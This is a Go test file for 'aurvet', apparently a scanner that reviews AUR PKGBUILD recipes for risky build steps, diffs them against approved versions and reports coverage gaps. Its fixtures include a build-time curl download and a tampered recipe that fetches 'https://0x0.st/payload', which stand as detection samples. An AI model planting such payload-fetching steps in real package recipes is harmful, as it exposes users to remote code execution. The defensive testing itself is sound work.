// cmd/aurvet/review_test.go
//
// Every test here runs against a FIXTURE root. None of them reads the live
// pacman configuration, the live helper cache or the live state directory, and
// none of them builds anything.
package main

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/lookatitude/aurvet/internal/config"
	"github.com/lookatitude/aurvet/internal/gate"
)

// reviewRoot builds a scanned root with one account and one yay clone whose
// recipe fetches at build time (one rule hit) and is long enough that printing
// it whole would bury the hit.
func reviewRoot(t *testing.T, body string) string {
	t.Helper()
	root := t.TempDir()
	writeFixture(t, root, "etc/passwd", "root:x:0:0::/root:/usr/bin/bash\nu:x:1000:1000::/home/u:/usr/bin/bash\n")
	if err := os.MkdirAll(filepath.Join(root, "var/lib/pacman/local"), 0o755); err != nil {
		t.Fatal(err)
	}
	writeFixture(t, root, "home/u/.cache/yay/foo/PKGBUILD", body)
	writeFixture(t, root, "home/u/.cache/yay/foo/.SRCINFO",
		"pkgbase = foo\n\tpkgver = 1.0\n\npkgname = foo-a\n\npkgname = foo-b\n")
	return root
}

func writeFixture(t *testing.T, root, rel, body string) {
	t.Helper()
	abs := filepath.Join(root, rel)
	if err := os.MkdirAll(filepath.Dir(abs), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(abs, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

// filler is the bulk a review must NOT print: unique lines that appear only in
// the body of the recipe, so a test can assert they were not rendered.
func filler(marker string, n int) string {
	var b strings.Builder
	for i := 0; i < n; i++ {
		b.WriteString("# ")
		b.WriteString(marker)
		b.WriteString("-filler-line\n")
	}
	return b.String()
}

const fetchingRecipe = "pkgbase=foo\npkgname=(foo-a foo-b)\npkgver=1.0\npkgrel=1\narch=('x86_64')\n" +
	"source=(\"https://example.com/foo-$pkgver.tar.gz\")\nsha256sums=('SKIP')\n" +
	"build() {\n  curl -fsSL https://example.com/blob.bin -o blob.bin\n}\n"

func TestReviewRequiresASubject(t *testing.T) {
	var stdout, stderr bytes.Buffer
	if code := run([]string{"review"}, &stdout, &stderr); code != exitUsage {
		t.Fatalf("run = %d, want %d\nstderr: %s", code, exitUsage, stderr.String())
	}
	if !strings.Contains(stderr.String(), "usage: aurvet review") {
		t.Errorf("stderr = %q, want a usage line", stderr.String())
	}
}

// TestReviewLeadsWithRuleHitsNotTheRecipe is the task's own sentence, asserted:
// the hits come before anything else and the recipe body is not printed.
func TestReviewLeadsWithRuleHitsNotTheRecipe(t *testing.T) {
	root := reviewRoot(t, fetchingRecipe+filler("unchanged", 200))

	var stdout, stderr bytes.Buffer
	code := run([]string{"-offline-root", root, "review", "foo"}, &stdout, &stderr)
	if code != exitFindings && code != exitIncomplete {
		t.Fatalf("run = %d, want 1 or 3\nstdout: %s\nstderr: %s", code, stdout.String(), stderr.String())
	}
	out := stdout.String()
	if !strings.Contains(out, "pkgbuild-build-network-fetch") {
		t.Fatalf("output does not lead with the rule hit:\n%s", out)
	}
	if strings.Contains(out, "unchanged-filler-line") {
		t.Errorf("the whole recipe was printed; nobody reads that:\n%s", out)
	}
	hits := strings.Index(out, "rule hits")
	if hits < 0 {
		t.Fatalf("output has no rule-hit section:\n%s", out)
	}
	if limits := strings.Index(out, "limits:"); limits >= 0 && limits < hits {
		t.Errorf("limits precede the rule hits; the hits must lead:\n%s", out)
	}
}

// TestReviewShowsADiffAgainstTheLastApprovedRecipe: the store holds the prior
// decision and the snapshot holds the prior text, so the review can show what
// moved instead of the whole file.
func TestReviewShowsADiffAgainstTheLastApprovedRecipe(t *testing.T) {
	before := fetchingRecipe + filler("unchanged", 200)
	root := reviewRoot(t, before)
	state := t.TempDir()
	t.Setenv("AURVET_STATE_DIR", state)

	// Capture the approved state, then record the human decision over it.
	var sout, serr bytes.Buffer
	if code := run([]string{"-offline-root", root, "snapshot", "foo"}, &sout, &serr); code != exitIncomplete {
		t.Fatalf("snapshot = %d\nstderr: %s", code, serr.String())
	}
	approveFixture(t, root, state, "foo", "home/u/.cache/yay/foo")

	// The recipe changes underneath that approval.
	writeFixture(t, root, "home/u/.cache/yay/foo/PKGBUILD",
		strings.Replace(before, "curl -fsSL https://example.com/blob.bin -o blob.bin",
			"curl -fsSL https://0x0.st/payload -o blob.bin", 1))

	var stdout, stderr bytes.Buffer
	code := run([]string{"-offline-root", root, "review", "foo"}, &stdout, &stderr)
	if code == exitClean || code == exitUsage {
		t.Fatalf("run = %d, want 1 or 3\nstdout: %s\nstderr: %s", code, stdout.String(), stderr.String())
	}
	out := stdout.String()
	if !strings.Contains(out, string(gate.StatusChanged)) {
		t.Errorf("output does not report the approval as changed:\n%s", out)
	}
	if !strings.Contains(out, "-  curl -fsSL https://example.com/blob.bin") ||
		!strings.Contains(out, "+  curl -fsSL https://0x0.st/payload") {
		t.Errorf("output carries no line-level diff of the change:\n%s", out)
	}
	// Context is deliberate -- diffContext lines either side of a change -- but
	// the 200-line body must not come through as context.
	if n := strings.Count(out, "unchanged-filler-line"); n > 2*diffContext {
		t.Errorf("the diff printed %d unchanged bulk lines, want at most %d:\n%s", n, 2*diffContext, out)
	}
}

// approveFixture records a human decision over the recipe as it stands.
//
// The store is opened with Root "/" so the write is permitted: under
// --offline-root gate refuses every write (INV-5), which is exactly why review
// can only ever READ an approval in that mode.
func approveFixture(t *testing.T, root, state, pkgbase, dir string) {
	t.Helper()
	r, err := os.OpenRoot(root)
	if err != nil {
		t.Fatal(err)
	}
	defer r.Close()
	rec, err := gate.DigestRecipe(r, gate.RecipeRequest{PkgBase: pkgbase, Dir: dir})
	if err != nil {
		t.Fatal(err)
	}
	st, err := gate.OpenStore(config.Config{StateDir: state, Root: "/"})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := st.Approve(rec, gate.ApproveOptions{By: "fixture"}); err != nil {
		t.Fatal(err)
	}
}

// TestReviewIsSilentAboutAnUnchangedApprovedRecipe: the store's whole purpose.
// Silent about the APPROVAL, not about coverage -- the fixture recipe still
// yields rule hits, and those are always shown.
func TestReviewIsSilentAboutAnUnchangedApprovedRecipe(t *testing.T) {
	root := reviewRoot(t, fetchingRecipe)
	state := t.TempDir()
	t.Setenv("AURVET_STATE_DIR", state)
	approveFixture(t, root, state, "foo", "home/u/.cache/yay/foo")

	var stdout, stderr bytes.Buffer
	run([]string{"-offline-root", root, "review", "foo"}, &stdout, &stderr)
	out := stdout.String()
	if !strings.Contains(out, string(gate.StatusApproved)) {
		t.Errorf("output does not state that this exact recipe is approved:\n%s", out)
	}
	if strings.Contains(out, "recipe diff") {
		t.Errorf("an unchanged recipe produced a diff section:\n%s", out)
	}
}

// TestReviewOfAnUnknownPkgBaseIsAGapNotSilence: INV-9. "I found no clone" must
// never render as "I reviewed this and found nothing".
func TestReviewOfAnUnknownPkgBaseIsAGapNotSilence(t *testing.T) {
	root := reviewRoot(t, fetchingRecipe)
	var stdout, stderr bytes.Buffer
	if code := run([]string{"-offline-root", root, "review", "absent"}, &stdout, &stderr); code != exitIncomplete {
		t.Fatalf("run = %d, want %d\nstdout: %s", code, exitIncomplete, stdout.String())
	}
	out := stdout.String()
	if !strings.Contains(out, "review-no-recipe") {
		t.Errorf("output does not report the absent recipe as a coverage gap:\n%s", out)
	}
	if strings.Contains(out, "rule hits (0)") {
		t.Errorf("output presents an unexamined package as examined and clean:\n%s", out)
	}
}

// TestReviewExitThreeOutranksExitOne: the recipe both fires a rule and cannot be
// fully analysed. INV-3.
func TestReviewExitThreeOutranksExitOne(t *testing.T) {
	root := reviewRoot(t, fetchingRecipe+"eval \"package_foo-a() { :; }\"\n")
	var stdout, stderr bytes.Buffer
	if code := run([]string{"-offline-root", root, "review", "foo"}, &stdout, &stderr); code != exitIncomplete {
		t.Fatalf("run = %d, want %d (a rule fired AND coverage is incomplete)\nstdout: %s",
			code, exitIncomplete, stdout.String())
	}
	out := stdout.String()
	if !strings.Contains(out, "pkgbuild-build-network-fetch") {
		t.Errorf("the finding was dropped when coverage was incomplete:\n%s", out)
	}
	if !strings.Contains(out, "not established") {
		t.Errorf("output does not state what it could not analyse:\n%s", out)
	}
}

// TestReviewFindingsOnlyExitsOne pins the other side of the pair, so the test
// above cannot pass by review always returning 3.
func TestReviewFindingsOnlyExitsOne(t *testing.T) {
	root := reviewRoot(t, "pkgbase=foo\npkgname=foo\npkgver=1.0\npkgrel=1\narch=('x86_64')\n"+
		"source=(\"https://example.com/foo-1.0.tar.gz\")\nsha256sums=('SKIP')\n"+
		"build() {\n  curl -fsSL https://example.com/blob.bin -o blob.bin\n}\n"+
		"package() {\n  install -Dm644 blob.bin \"$pkgdir/usr/share/foo/blob.bin\"\n}\n")
	writeFixture(t, root, "home/u/.cache/yay/foo/.SRCINFO", "pkgbase = foo\n\tpkgver = 1.0\n\npkgname = foo\n")

	var stdout, stderr bytes.Buffer
	if code := run([]string{"-offline-root", root, "review", "foo"}, &stdout, &stderr); code != exitFindings {
		t.Fatalf("run = %d, want %d\nstdout: %s\nstderr: %s", code, exitFindings, stdout.String(), stderr.String())
	}
}

// TestReviewNeverBuildsAndNeverWrites: INV-2 and INV-5. The examined tree is
// byte-identical afterwards.
func TestReviewNeverBuildsAndNeverWrites(t *testing.T) {
	root := reviewRoot(t, fetchingRecipe)
	before := walkTree(t, root)
	var stdout, stderr bytes.Buffer
	run([]string{"-offline-root", root, "review", "foo"}, &stdout, &stderr)
	if after := walkTree(t, root); after != before {
		t.Errorf("review wrote into the examined tree:\nbefore\n%s\nafter\n%s", before, after)
	}
}

// TestReviewShowRecipePrintsTheFullTextOnRequest: available on request, not by
// default.
func TestReviewShowRecipePrintsTheFullTextOnRequest(t *testing.T) {
	root := reviewRoot(t, fetchingRecipe+filler("unchanged", 20))
	var stdout, stderr bytes.Buffer
	run([]string{"-offline-root", root, "-show-recipe", "review", "foo"}, &stdout, &stderr)
	if !strings.Contains(stdout.String(), "unchanged-filler-line") {
		t.Errorf("-show-recipe did not print the recipe:\n%s", stdout.String())
	}
}

// TestReviewAcceptsADirectory: `review <dir|pkgbase>` (spec §14).
func TestReviewAcceptsADirectory(t *testing.T) {
	root := reviewRoot(t, fetchingRecipe)
	var stdout, stderr bytes.Buffer
	code := run([]string{"-offline-root", root, "review", "home/u/.cache/yay/foo"}, &stdout, &stderr)
	if code == exitUsage {
		t.Fatalf("run = %d (usage)\nstderr: %s", code, stderr.String())
	}
	if !strings.Contains(stdout.String(), "pkgbuild-build-network-fetch") {
		t.Errorf("a directory subject was not reviewed:\n%s", stdout.String())
	}
}

// TestReviewDigestsWhatItCanWhenALocalSourceIsAbsent is a real-recipe defect,
// caught by running the flow against google-chrome: its source=() names
// google-chrome-stable.sh, and a clone that does not carry that file used to sink
// the whole recipe digest -- so the package could never be approved and the store
// could never go silent for it. The digest must cover what is there and say what
// it does not cover.
func TestReviewDigestsWhatItCanWhenALocalSourceIsAbsent(t *testing.T) {
	root := reviewRoot(t, "pkgbase=foo\npkgname=foo\npkgver=1.0\npkgrel=1\narch=('x86_64')\n"+
		"source=(\"https://example.com/foo-1.0.tar.gz\" \"absent-patch.diff\")\nsha256sums=('SKIP' 'SKIP')\n")
	writeFixture(t, root, "home/u/.cache/yay/foo/.SRCINFO", "pkgbase = foo\n\tpkgver = 1.0\n\npkgname = foo\n")

	var stdout, stderr bytes.Buffer
	run([]string{"-offline-root", root, "-json", "review", "foo"}, &stdout, &stderr)
	var got struct {
		Recipes []struct {
			Digest string `json:"digest"`
			Files  []struct {
				Name string `json:"name"`
			} `json:"files"`
		} `json:"recipes"`
		Gaps []struct {
			RuleID string `json:"rule_id"`
		} `json:"gaps"`
	}
	if err := json.Unmarshal(stdout.Bytes(), &got); err != nil {
		t.Fatalf("stdout is not parseable JSON: %v\n%s", err, stdout.String())
	}
	if len(got.Recipes) != 1 || got.Recipes[0].Digest == "" {
		t.Fatalf("no digest was produced, so this recipe can never be approved: %+v", got)
	}
	if len(got.Recipes[0].Files) != 1 || got.Recipes[0].Files[0].Name != "PKGBUILD" {
		t.Errorf("digest manifest = %+v, want PKGBUILD only", got.Recipes[0].Files)
	}
	var saw bool
	for _, g := range got.Gaps {
		if g.RuleID == ruleAuxSkipped {
			saw = true
		}
	}
	if !saw {
		t.Errorf("the uncovered local source is not reported as a gap: %s", stdout.String())
	}
}

func TestReviewJSONIsParseable(t *testing.T) {
	root := reviewRoot(t, fetchingRecipe)
	var stdout, stderr bytes.Buffer
	run([]string{"-offline-root", root, "-json", "review", "foo"}, &stdout, &stderr)
	var got struct {
		Subject string `json:"subject"`
		Recipes []struct {
			PkgBase  string `json:"pkgbase"`
			Dir      string `json:"dir"`
			Digest   string `json:"digest"`
			Approval string `json:"approval"`
		} `json:"recipes"`
		Findings []struct {
			RuleID string `json:"rule_id"`
		} `json:"findings"`
		Gaps []struct {
			RuleID string `json:"rule_id"`
		} `json:"gaps"`
	}
	if err := json.Unmarshal(stdout.Bytes(), &got); err != nil {
		t.Fatalf("stdout is not parseable JSON: %v\n%s", err, stdout.String())
	}
	if len(got.Recipes) != 1 || got.Recipes[0].PkgBase != "foo" || got.Recipes[0].Digest == "" {
		t.Errorf("JSON does not carry the reviewed recipe: %+v", got)
	}
	if len(got.Findings) == 0 {
		t.Errorf("JSON carries no findings: %s", stdout.String())
	}
}
